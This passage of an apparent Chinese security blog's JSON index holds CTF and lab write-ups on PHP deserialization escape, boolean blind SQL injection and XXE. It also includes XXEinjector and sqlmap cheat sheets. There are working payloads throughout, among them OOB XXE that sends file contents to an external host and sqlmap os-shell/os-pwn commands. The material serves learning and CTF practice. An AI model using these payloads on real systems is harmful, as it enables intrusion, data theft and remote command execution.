$c-&gt;pass;?&gt;\n\n运行结果：\nO:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:81:&quot;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;&quot;;s:4:&quot;pass&quot;;s:6:&quot;123456&quot;;&#125;O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:81:&quot;ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;&quot;;s:4:&quot;pass&quot;;s:6:&quot;123456&quot;;&#125;A Object(    [name] =&gt; ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc    [pass] =&gt; hacker)hacker\n\n此时，成功逃逸，修改了pass的值\n填充的27个bb，在经过filter函数过滤后会增加27个字符的长度，这27个字符会填充当前payload字符串的长度，而payload则顺利的逃逸处了php反序列化中s的检查\n被逃逸出的payload会被当成当前类的属性继续执行&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;，而后一部分由于前面的payload已经构成了闭合，所以不在执行\n[NewStar2023 week4]逃题目：\n &lt;?phphighlight_file(__FILE__);function waf($str)&#123;    return str_replace(&quot;bad&quot;,&quot;good&quot;,$str);&#125;class GetFlag &#123;    public $key;    public $cmd = &quot;whoami&quot;;    public function __construct($key)    &#123;        $this-&gt;key = $key;    &#125;    public function __destruct()    &#123;        system($this-&gt;cmd);    &#125;&#125;unserialize(waf(serialize(new GetFlag($_GET[&#x27;key&#x27;])))); www-data www-data \n\n经典的php反序列化字符逃逸\n首先构造序列化代码：\n&lt;?phpfunction waf($str)&#123;    return str_replace(&quot;bad&quot;,&quot;good&quot;,$str);&#125;class GetFlag &#123;    public $key=&#x27;bad&#x27;;       public $cmd = &quot;ls /&quot;;&#125;$a = new GetFlag();echo serialize($a).&quot;\\n&quot;;\n\nO:7:&quot;GetFlag&quot;:2:&#123;s:3:&quot;key&quot;;s:3:&quot;bad&quot;;s:3:&quot;cmd&quot;;s:4:&quot;ls /&quot;;&#125;\n我们需要逃逸的是&quot;;s:3:&quot;cmd&quot;;s:4:&quot;ls /&quot;;&#125;\n&lt;?phpfunction waf($str)&#123;    return str_replace(&quot;bad&quot;,&quot;good&quot;,$str);&#125;class GetFlag &#123;    public $key=&#x27;&quot;;s:3:&quot;cmd&quot;;s:4:&quot;ls /&quot;;&#125;&#x27;;      public $cmd = &quot;ls /&quot;;&#125;$a = new GetFlag();echo serialize($a).&quot;\\n&quot;;\n\n\n\nO:7:&quot;GetFlag&quot;:2:&#123;s:3:&quot;key&quot;;s:24:&quot;&quot;;s:3:&quot;cmd&quot;;s:4:&quot;ls /&quot;;&#125;&quot;;s:3:&quot;cmd&quot;;s:4:&quot;ls /&quot;;&#125;\n总共24个字符，于是我们写24个bad就行\n&lt;?phpfunction waf($str)&#123;    return str_replace(&quot;bad&quot;,&quot;good&quot;,$str);&#125;class GetFlag &#123;    public $key=&#x27;badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad&quot;;s:3:&quot;cmd&quot;;s:4:&quot;ls /&quot;;&#125;&#x27;;      public $cmd = &quot;ls /&quot;;&#125;$a = new GetFlag();echo serialize($a).&quot;\\n&quot;;$res = waf(serialize($a));echo $res.&quot;\\n&quot;;$c = unserialize($res);print_r($c).&quot;\\n&quot;;echo $c-&gt;cmd;\n\n运行结果：\nO:7:&quot;GetFlag&quot;:2:&#123;s:3:&quot;key&quot;;s:96:&quot;badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad&quot;;s:3:&quot;cmd&quot;;s:4:&quot;ls /&quot;;&#125;&quot;;s:3:&quot;cmd&quot;;s:4:&quot;ls /&quot;;&#125;O:7:&quot;GetFlag&quot;:2:&#123;s:3:&quot;key&quot;;s:96:&quot;goodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgood&quot;;s:3:&quot;cmd&quot;;s:4:&quot;ls /&quot;;&#125;&quot;;s:3:&quot;cmd&quot;;s:4:&quot;ls /&quot;;&#125;GetFlag Object(    [key] =&gt; goodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgood    [cmd] =&gt; ls /)ls /\n\npayload：\nkey = badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad&quot;;s:3:&quot;cmd&quot;;s:4:&quot;ls /&quot;;&#125;&quot; \n\n接着构造payload查看flag\n/?key=badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad&quot;;s:3:&quot;cmd&quot;;s:9:&quot;cat /flag&quot;;&#125;\n\n","categories":["PHP"],"tags":["PHP","序列化","反序列化","字符逃逸"]},{"title":"PHP序列化基础知识","url":"/PHP%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/","content":"序列化和反序列化的概念序列化就是将对象转换成字符串。字符串包括 属性名 属性值 属性类型和该对象对应的类名。 反序列化则相反将字符串重新恢复成对象。 对象的序列化利于对象的保存和传输,也可以让多个文件共享对象。\n序列化中常见的魔法函数：__construct() 创建对象时调用__destruct() 销毁对象时调用__toString() 当一个对象被当作一个字符串使用__sleep() 在对象在被序列化之前运行__wakeup 将在序列化之后立即被调用\n\n\n看一串字符串O:3:&quot;Ctf&quot;:3&#123;s:4:&quot;flag&quot;;s:13:&quot;flag&#123;abedyui&#125;&quot;;s:4:&quot;name&quot;;s:7:&quot;Sch0lar&quot;;s:3:&quot;age&quot;;s:2:&quot;18&quot;;&#125;O代表对象 因为我们序列化的是一个对象 序列化数组则用A来表示3 代表类名字占三个字符 ctf 类名3 代表三个属性s代表字符串4代表属性名长度flag属性名s:13:&quot;flag&#123;abedyui&#125;&quot; 字符串 属性值长度 属性值\n\n访问控制修饰符根据访问控制修饰符的不同 序列化后的 属性长度和属性值会有所不同,所以这里简单提一下\npublic(公有)protected(受保护)private(私有的)protected属性被序列化的时候属性值会变成：%00*%00属性名private属性被序列化的时候属性值会变成：%00类名%00属性名\n\n就像这样\nO:4:&quot;Name&quot;:2:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125;//这里是private属性被序列化\n\n绕过__wakeup()函数当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过__wakeup的执行。\n//将上面的对象属性个数值改成逼真实个数打O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125;\n\n[极客大挑战 2019]PHP&lt;?phpinclude &#x27;flag.php&#x27;;error_reporting(0);class Name&#123;    private $username = &#x27;nonono&#x27;;    private $password = &#x27;yesyes&#x27;;    public function __construct($username,$password)&#123;        $this-&gt;username = $username;        $this-&gt;password = $password;    &#125;    function __wakeup()&#123;        $this-&gt;username = &#x27;guest&#x27;;    &#125;    function __destruct()&#123;        if ($this-&gt;password != 100) &#123;            echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;;            echo &quot;You name is: &quot;;            echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;;            echo &quot;You password is: &quot;;            echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;;            die();        &#125;        if ($this-&gt;username === &#x27;admin&#x27;) &#123;            global $flag;            echo $flag;        &#125;else&#123;            echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;;            die();                    &#125;    &#125;&#125;?&gt;\n\n得到\nO:4:&quot;Name&quot;:2:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125;\n\n绕过__wakeup\nO:4:&quot;Name&quot;:3:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125;\n\nprivate属性被序列化的时候属性值会变成%00类名%00属性名,根据规则进行修改\nO:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125;\n\n然后?select传值\n?select=O:4:&quot;Name&quot;:3&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125;\n\nhttps://blog.csdn.net/weixin_45785288/article/details/109877324\n","categories":["PHP"],"tags":["序列化","反序列化","php"]},{"title":"WebsiteManger","url":"/WebsiteManger/","content":"2021-第四届红帽杯网络安全大赛-Web-WebsiteManger\n\n首先f12检查源文件 发现图片可能存在注入点 ：\n\n\n布尔盲注知识点\n\n&#x2F;image.php?id&#x3D;if(1&#x3D;1,1,5)              True\n&#x2F;image.php?id&#x3D;if(1&#x3D;2,1,5)              False\n\n解释: 条件为真时?id=1，回显第一张图片，条件为假时?id=5，没有id=5的图片，什么都没有。即可作为布尔盲注判断条件\n\n脚本测试：\n\nimport requestsall_str = &#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!&quot;#$%&amp;\\&#x27;()*+,-./:;&lt;=&gt;?@[\\]^_`&#123;|&#125;~&#x27;url = &#x27;http://challenge-ebd076868bb77c54.sandbox.ctfhub.com:10800/image.php&#x27;info = &#x27;&#x27;for i in range(1, 50):    for s in all_str:        payload = &#x27;?id=if((ascii(mid(database(),&#123;&#125;,1))=&#123;&#125;),1,5)&#x27;.format(i, ord(s))        ans = requests.get(url=url + payload)        if len(ans.text) &gt; 1000:            info += s            print(payload)            print(info)\n\n以上判断出database()=ctf\n\n\n根据网上writeup清晰得知：\n\n#爆破数据库payload = &#x27;?id=if((ascii(mid(database(),&#123;&#125;,1))=&#123;&#125;),1,5)&#x27;.format(i,ord(s))#爆破表名payload = &#x27;?id=if(ascii(mid((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=\\&#x27;ctf\\&#x27;),&#123;&#125;,1))=&#123;&#125;,1,5)&#x27;.format(i,ord(s))#爆破列名payload = &#x27;?id=if(ascii(mid((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=\\&#x27;users\\&#x27;),&#123;&#125;,1))=&#123;&#125;,1,5)&#x27;.format(i,ord(s))#爆破字段payload = &#x27;?id=if(ascii(mid((select/**/group_concat(username,password)/**/from/**/ctf.users),&#123;&#125;,1))=&#123;&#125;,1,5)&#x27;.format(i,ord(s))这里在做题的时候，发现爆破字段得到的结果不是ctf下的users的字段，因为没有加ctf这个限制，应该是爆破到了其他数据库下的users中的字段，需要加上数据库名ctf的限制条件，不过这里题目有对 ‘and’关键字过滤，所以需要用‘&amp;&amp;’替换，而且还要编码为ulr格式‘%26%26’，这里也是用brupsuit抓包分析了很久才发现的，不过只要有耐心，最终还是会发现。修改后的payloadpayload = &#x27;?id=if(ascii(mid((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=\\&#x27;users\\&#x27;/**/%26%26/**/table_schema=database()),&#123;&#125;,1))=&#123;&#125;,1,5)&#x27;.format(i, ord(s))\n\n\n关键函数解释\nmid() 函数：截取字符串一部分，mid(column_name,start[,length])\nord() 函数：是 chr() 函数（对于8位的ASCII字符串），它以一个字符（长度为1的字符串）作为参数，返回对应的 ASCII 数值。返回值是对应的十进制整数。\ngroup_concat() 函数：连接一个组的所有字符串，并以逗号分隔每一条数据。能一次性查出所有信息。group_concat(str1,str2,…)\n\n\n\n\n最后得知的信息\n\nTables_in_ctf: users,imagesColumns_in_users: USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password(此处与writeup有出入)values_in_users: adminf5b86501931f812ed3833dee67a43603\t\t\t\t adminc6ef523a171bb9a25f4115044b507d69\n\n\n\n登录成功后\n\n\n此处测试发现有ssrf漏洞 输出127.0.0.1后反馈信息出现了(curl)\n\n抓包得到flag\n\n官方注入脚本import requestsimport stringcharset = &quot;,@&quot;+ string.digits + string.ascii_lowercase + string.ascii_uppercasedef r(s):    s = s.replace(&quot; &quot;, &quot;/**/&quot;)    return ssql = r(&quot;select concat(id,username,password) from users&quot;)result = &quot;&quot;for i in range(1,50):    for c in charset:        cc = ord(c)        url = f&quot;http://challenge-ebd076868bb77c54.sandbox.ctfhub.com:10800/image.php?id=-1/**/or/**/(ascii(mid((&#123;sql&#125;),&#123;i&#125;,1))=&#123;cc&#125;)&quot;        r = requests.get(url)        if len(r.text) &gt; 1024:            result += c            print(result)            break\n\n\n","categories":["CTF","ctfhub"],"tags":["web","sql注入","ssrf"]},{"title":"XML XXE漏洞","url":"/XML-XXE%E6%BC%8F%E6%B4%9E/","content":"XML XXE漏洞基础概念1、xml基础概念XML被设计为传输和存储数据，XML文档结构包括XML声明、DTD文档类型定义(可选)、文档元素，其焦点是数据的内容，其把数据从HTML分离，是独立于软件和硬件的信息传输工具。XXE漏洞全称XMLExternal Entity Injection，即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站等危害。\n2、XML与HTML的主要差异XML被设计为传输和存储数据，其焦点是数据的内容。\nHTML被设计用来显示数据，其焦点是数据的外观。\nHTML旨在显示信息，而XML旨在传输信息。\n3、xml示例&lt;!--文档类型定义--&gt;&lt;!DOCTYPE note [\t&lt;!--定义此文档时note类型的文档--&gt;&lt;!ELEMENT note (to,from,heading,body)&gt;\t&lt;!--定义note元素有四个元素--&gt;&lt;!ELEMENT to (#PCDATA)&gt;\t\t\t&lt;!--定义to元素为&quot;#PCDATA&quot;类型--&gt;&lt;!ELEMENT from (#PCDATA)&gt;\t\t&lt;!--定义from元素为&quot;#PCDATA&quot;类型--&gt;&lt;!ELEMENT head (#PCDATA)&gt;\t\t&lt;!--定义head元素为&quot;#PCDATA&quot;类型--&gt;&lt;!ELEMENT body (#PCDATA)&gt;\t\t&lt;!--定义body元素为&quot;#PCDATA&quot;类型--&gt;]]]&gt;&lt;!--文档元素--&gt;&lt;note&gt;    &lt;to&gt;Dave&lt;/to&gt;    &lt;from&gt;Tom&lt;/from&gt;    &lt;head&gt;Reminder&lt;/head&gt;    &lt;body&gt;You are a good man&lt;/body&gt;&lt;/note&gt;\n\nDTDDTD：Document Type Definition  即文档类型定义，用来为XML文档定义语义约束。可以嵌入在XML文档中(内部声明)，也可以独立的放在一个文件中(外部引用)，由于其支持的数据类型有限，无法对元素或属性的内容进行详细规范，在可读性和可扩展性方面也比不上XML Schema。\nDTD一般认为有两种引用或声明方式：\n\n1、内部DTD：即对XML文档中的元素、属性和实体的DTD的声明都在XML文档中。\n2、外部DTD：即对XML文档中的元素、属性和实体的DTD的声明都在一个独立的DTD文件（.dtd）中。\n\nDTD实体有以下几种声明方式\n内部实体&lt;!DOCTYPE note [    &lt;!ENTITY a &quot;admin&quot;&gt;]&gt;&lt;note&gt;&amp;a&lt;/note&gt;&lt;!-- admin --&gt;\n\n参数实体&lt;!DOCTYPE note&gt; [    &lt;!ENTITY % b &quot;&lt;!ENTITY b1 &quot;awsl&quot;&gt;&quot;&gt;    %b;]&gt;&lt;note&gt;&amp;b1&lt;/note&gt;&lt;!-- awsl --&gt;\n\n\n参数实体用% name申明，引用时用%name;，只能在DTD中申明，DTD中引用。\n其余实体直接用name申明，引用时用&amp;name;，只能在DTD中申明，可在xml文档中引用\n\n外部实体&lt;!DOCTYPE note&gt; [    &lt;!ENTITY c SYSTEM &quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;&gt;]&gt;&lt;note&gt;&amp;c&lt;/note&gt;&lt;!-- Y2w0eV9uZWVkX2FfZ3JpbGZyaWVuZA== --&gt;\n\n外部引用可支持http，file等协议，不同的语言支持的协议不同，但存在一些通用的协议，具体内容如下所示：\n\n上图是默认支持协议，还可以支持其他，如PHP支持的扩展协议有\n\n靶场讲解 (pikachu xxe漏洞)\n\n文件读取\n\n&lt;?xml version=&quot;1.0&quot;?&gt; &lt;!DOCTYPE foo [    &lt;!ENTITY xxe SYSTEM &quot;file:///d:/test.txt&quot; &gt; ]&gt; &lt;foo&gt;&amp;xxe;&lt;/foo&gt;\n\n\n\n内网探针或攻击内网应用（触发漏洞地址）\n\n&lt;?xml version = &quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTYTY rabbit SYSTEM &quot;http://192.168.1.4:80/index.txt&quot;&gt;]&gt;&lt;foo&gt;&amp;rabbit;&lt;/foo&gt;\n\n上面的ip地址假设就是内网的一台服务器的ip地址。还可以进行一个端口扫描，看一下端口是否开放。\n无回显-读取文件\n&lt;?xml version = &quot;1.0&quot;?&gt;&lt;!DOCTYPE test [\t\t&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=d:/test.txt&quot;&gt;\t\t&lt;!ENTITY % dtd SYSTEM &quot;http://192.168.xx.xxx:80XX/test.dtd&quot;&gt;\t\t%dtd;\t\t%send;]&gt;test.dtd:&lt;!ENTITY % payload\t&quot;&lt;!ENTITY &amp;#x25; send SYSTEM&#x27;http://192.168.xx.xxx:80xx/?data=%file;&#x27;&gt;&quot;&gt;%payload;\n\n上面的url一般是自己的网站，通过第一步访问文件，然后再访问dtd文件，把读取到的数据赋给data，然后我们只需要再自己的网站日志，或者写个php脚本保存下来，就能看到读取到的文件数据了。\n绕过ENTITY SYSTEM file等关键词被过滤使用编码方式绕过：UTF-16BE cat payload.xml | iconv -f utf-8 -t utf-16be &gt; payload.8-16be.xml\n若http被过滤，可以\ndata:&#x2F;&#x2F;协议绕过&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;!DOCTYPE test [    &lt;!ENTITY % a &quot; &lt;!ENTITY %  b SYSTEM &#x27;http://118.25.14.40:8200/hack.dtd&#x27;&gt; &quot;&gt;     %a;    %b;]&gt;&lt;test&gt;&amp;hhh;&lt;/test&gt;\n\nfile:&#x2F;&#x2F;协议加文件上传&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;!DOCTYPE test [    &lt;!ENTITY % a SYSTEM &quot;file:///var/www/uploads/cfcd208495d565ef66e7dff9f98764da.jpg&quot;&gt;    %a;]&gt;&lt;!--上传文件--&gt;&lt;!ENTITY % b SYSTEM &#x27;http://118.25.14.40:8200/hack.dtd&#x27;&gt;\n\nphp:&#x2F;&#x2F;filter协议加文件上传&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;!DOCTYPE test [    &lt;!ENTITY % a SYSTEM &quot;php://filter/resource=/var/www/uploads/cfcd208495d565ef66e7dff9f98764da.jpg&quot;&gt;    %a;]&gt;    &lt;test&gt;        &amp;hhh;    &lt;/test&gt;&lt;!--上传文件--&gt;&lt;!ENTITY hhh SYSTEM &#x27;php://filter/read=convert.base64-encode/resource=./flag.php&#x27;&gt;\n\n\n\n&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;!DOCTYPE test [    &lt;!ENTITY % a SYSTEM &quot;php://filter/read=convert.base64-decode/resource=/var/www/uploads/cfcd208495d565ef66e7dff9f98764da.jpg&quot;&gt;    %a;]&gt;    &lt;test&gt;        &amp;hhh;    &lt;/test&gt;&lt;!--上传文件--&gt;PCFFTlRJVFkgaGhoIFNZU1RFTSAncGhwOi8vZmlsdGVyL3JlYWQ9Y29udmVydC5iYXNlNjQtZW5jb2RlL3Jlc291cmNlPS4vZmxhZy5waHAnPg==\n\nxxe工具​          XXEinjector本身提供了非常非常丰富的操作选项，所以大家在利用XXEinjector进行渗透测试之前，请自习了解这些配置选项，以最大限度地发挥XXEinjector的功能。当然了，由于XXEinjector是基于Ruby开发的，所以Ruby运行环境就是必须的了。这里建议在kali环境下运行。\n参数说明--host     \t\t\t必填项– 用于建立反向链接的IP地址。(--host=192.168.0.2)--file      \t\t必填项- 包含有效HTTP请求的XML文件。(--file=/tmp/req.txt)--path           必填项-是否需要枚举目录 – 枚举路径。(--path=/etc)--brute          必填项-是否需要爆破文件 -爆破文件的路径。(--brute=/tmp/brute.txt)--logger        \t记录输出结果。--rhost          远程主机IP或域名地址。(--rhost=192.168.0.3)--rport          远程主机的TCP端口信息。(--rport=8080)--phpfilter    \t在发送消息之前使用PHP过滤器对目标文件进行Base64编码。--netdoc     \t\t使用netdoc协议。(Java).--enumports   枚举用于反向链接的未过滤端口。(--enumports=21,22,80,443,445)--hashes       窃取运行当前应用程序用户的Windows哈希。--expect        使用PHP expect扩展执行任意系统命令。(--expect=ls)--upload       使用Java jar向临时目录上传文件。(--upload=/tmp/upload.txt)--xslt      \t\tXSLT注入测试。--ssl              使用SSL。--proxy         使用代理。(--proxy=127.0.0.1:8080)--httpport \t\tSet自定义HTTP端口。(--httpport=80)--ftpport       设置自定义FTP端口。(--ftpport=21)--gopherport  设置自定义gopher端口。(--gopherport=70)--jarport       设置自定义文件上传端口。(--jarport=1337)--xsltport  \t设置自定义用于XSLT注入测试的端口。(--xsltport=1337)--test     \t\t该模式可用于测试请求的有效。--urlencode     URL编码，默认为URI。--output       爆破攻击结果输出和日志信息。(--output=/tmp/out.txt)--timeout     设置接收文件/目录内容的Timeout。(--timeout=20)--contimeout  设置与服务器断开连接的，防止DoS出现。(--contimeout=20)--fast     \t\t跳过枚举询问，有可能出现结果假阳性。--verbose     显示verbose信息。\n\n工具使用枚举HTTPS应用程序中的&#x2F;etc目录：\nruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/req.txt –ssl\n\n使用gopher（OOB方法）枚举&#x2F;etc目录：\nruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/req.txt --oob=gopher\n\n二次漏洞利用：\nruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/vulnreq.txt--2ndfile=/tmp/2ndreq.txt\n\n使用HTTP带外方法和netdoc协议对文件进行爆破攻击：\nruby XXEinjector.rb --host=192.168.0.2 --brute=/tmp/filenames.txt--file=/tmp/req.txt --oob=http –netdoc\n\n通过直接性漏洞利用方式进行资源枚举：\nruby XXEinjector.rb --file=/tmp/req.txt --path=/etc --direct=UNIQUEMARK\n\n枚举未过滤的端口：\nruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --enumports=all\n\n窃取Windows哈希：\nruby XXEinjector.rb--host=192.168.0.2 --file=/tmp/req.txt –hashes\n\n使用Java jar上传文件：\nruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt--upload=/tmp/uploadfile.pdf\n\n使用PHP expect执行系统指令：\nruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --oob=http --phpfilter--expect=ls\n\n测试XSLT注入：\nruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt –xslt\n\n记录请求信息：\nruby XXEinjector.rb --logger --oob=http--output=/tmp/out.txt\n\n","categories":["Web"],"tags":["XML","XXE"]},{"title":"sqlmap 常用指令","url":"/sqlmap-%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/","content":"sqlmap 常用指令SQLMap 是一款自动化的SQL注入测试工具，在 kali 上已集成\n基本操作笔记：-u  #注入点 -f  #指纹判别数据库类型 -b  #获取数据库版本信息 -p  #指定可测试的参数(?page=1&amp;id=2 -p &quot;page,id&quot;) -D &quot;&quot;  #指定数据库名 -T &quot;&quot;  #指定表名 -C &quot;&quot;  #指定字段 -s &quot;&quot;  #保存注入过程到一个文件,还可中断，下次恢复在注入(保存：-s &quot;xx.log&quot;　　恢复:-s &quot;xx.log&quot; --resume) --level=(1-5) #要执行的测试水平等级，默认为1 \t--level1：默认的等级，会进行基本的测试，包括GET和POST方式。\t--level2: 在原有的基础上增加对cookie的检测。 \t--level3: 增加对User Agent、Referer 的检测 \t--lever4: 更多的payload \t--level5: 最高等级，包含所有的payload,会尝试自动破解出cookie、xff等头部注入。\t--risk=(0-3)  #测试执行的风险等级，默认为1 --time-sec=(2,5) #延迟响应，默认为5 --data #通过POST发送数据 --columns        #列出字段 --current-user   #获取当前用户名称 --current-db     #获取当前数据库名称 --users          #列数据库所有用户 --passwords      #数据库用户所有密码 --privileges     #查看用户权限(--privileges -U root) -U               #指定数据库用户 --dbs            #列出所有数据库 --tables -D &quot;&quot;   #列出指定数据库中的表 --columns -T &quot;user&quot; -D &quot;mysql&quot;      #列出mysql数据库中的user表的所有字段 --dump-all            #列出所有数据库所有表 --exclude-sysdbs      #只列出用户自己新建的数据库和表 --dump -T &quot;&quot; -D &quot;&quot; -C &quot;&quot;   #列出指定数据库的表的字段的数据(--dump -T users -D master -C surname) --dump -T &quot;&quot; -D &quot;&quot; --start 2 --top 4  # 列出指定数据库的表的2-4字段的数据 --dbms    #指定数据库(MySQL,Oracle,PostgreSQL,Microsoft SQL Server,Microsoft Access,SQLite,Firebird,Sybase,SAP MaxDB) --os      #指定系统(Linux,Windows) -v  #详细的等级(0-6)     0：只显示Python的回溯，错误和关键消息。     1：显示信息和警告消息。     2：显示调试消息。     3：有效载荷注入。     4：显示HTTP请求。     5：显示HTTP响应头。     6：显示HTTP响应页面的内容 --privileges  #查看权限 --is-dba      #是否是数据库管理员 --roles       #枚举数据库用户角色 --udf-inject  #导入用户自定义函数（获取系统权限） --union-check  #是否支持union 注入 --union-cols #union 查询表记录 --union-test #union 语句测试 --union-use  #采用union 注入 --union-tech orderby #union配合order by --data &quot;&quot; #POST方式提交数据(--data &quot;page=1&amp;id=2&quot;) --cookie &quot;用;号分开&quot;      #cookie注入(--cookies=&quot;PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low&quot;) --referer &quot;&quot;     #使用referer欺骗(--referer &quot;http://www.baidu.com&quot;) --user-agent &quot;&quot;  #自定义user-agent --proxy &quot;http://127.0.0.1:8118&quot; #代理注入 --string=&quot;&quot;    #指定关键词,字符串匹配. --threads 　　  #采用多线程(--threads 3) --sql-shell    #执行指定sql命令 --sql-query    #执行指定的sql语句(--sql-query &quot;SELECT password FROM mysql.user WHERE user = &#x27;root&#x27; LIMIT 0, 1&quot; ) --file-read    #读取指定文件 --file-write   #写入本地文件(--file-write /test/test.txt --file-dest /var/www/html/1.txt;将本地的test.txt文件写入到目标的1.txt) --file-dest    #要写入的文件绝对路径 --os-cmd=id    #执行系统命令 --os-shell     #系统交互shell --os-pwn       #反弹shell(--os-pwn --msf-path=/opt/framework/msf3/) --msf-path=    #matesploit绝对路径(--msf-path=/opt/framework/msf3/) --os-smbrelay  # --os-bof       # --reg-read     #读取win系统注册表 --priv-esc     # --time-sec=    #延迟设置 默认--time-sec=5 为5秒 -p &quot;user-agent&quot; --user-agent &quot;sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)&quot;  #指定user-agent注入 --eta          #盲注 /pentest/database/sqlmap/txt/common-columns.txt　　字段字典　　　 common-outputs.txt common-tables.txt      表字典 keywords.txt oracle-default-passwords.txt user-agents.txt wordlist.txt 常用语句 :1./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -f -b --current-user --current-db --users --passwords --dbs -v 0 2./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --passwords -U root --union-use -v 2 3./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --dump -T users -C username -D userdb --start 2 --stop 3 -v 2 4./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --dump -C &quot;user,pass&quot;  -v 1 --exclude-sysdbs 5./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --sql-shell -v 2 6./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --file-read &quot;c:\\boot.ini&quot; -v 2 7./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --file-write /test/test.txt --file-dest /var/www/html/1.txt -v 2 8./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-cmd &quot;id&quot; -v 1 9./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-shell --union-use -v 2 10./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-pwn --msf-path=/opt/framework/msf3 --priv-esc -v 1 11./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-pwn --msf-path=/opt/framework/msf3 -v 1 12./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-bof --msf-path=/opt/framework/msf3 -v 1 13./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 --reg-add --reg-key=&quot;HKEY_LOCAL_NACHINE\\SOFEWARE\\sqlmap&quot; --reg-value=Test --reg-type=REG_SZ --reg-data=1 14./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --eta 15./sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mysql/get_str_brackets.php?id=1&quot; -p id --prefix &quot;&#x27;)&quot; --suffix &quot;AND (&#x27;abc&#x27;=&#x27;abc&quot;16./sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mysql/basic/get_int.php?id=1&quot; --auth-type Basic --auth-cred &quot;testuser:testpass&quot;17./sqlmap.py -l burp.log --scope=&quot;(www)?\\.target\\.(com|net|org)&quot;18./sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mysql/get_int.php?id=1&quot; --tamper tamper/between.py,tamper/randomcase.py,tamper/space2comment.py -v 3 19./sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mssql/get_int.php?id=1&quot; --sql-query &quot;SELECT &#x27;foo&#x27;&quot; -v 1 20./sqlmap.py -u 